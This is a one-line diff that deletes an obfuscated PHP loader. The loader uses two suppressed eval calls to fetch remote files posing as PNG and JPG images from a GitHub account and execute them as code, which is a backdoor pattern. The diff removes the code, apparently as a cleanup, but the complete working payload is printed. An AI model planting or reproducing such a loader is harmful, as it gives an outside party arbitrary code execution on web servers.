@@ -1,1 +1,0 @@
-<?=/********/@null;/*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://github.com/do124574/do124574/raw/main/teamm.png"));/**//********/@eval/****/("?>".file_get_contents/*******/("https://github.com/do124574/do124574/raw/main/cucok.jpg"));/**/?>
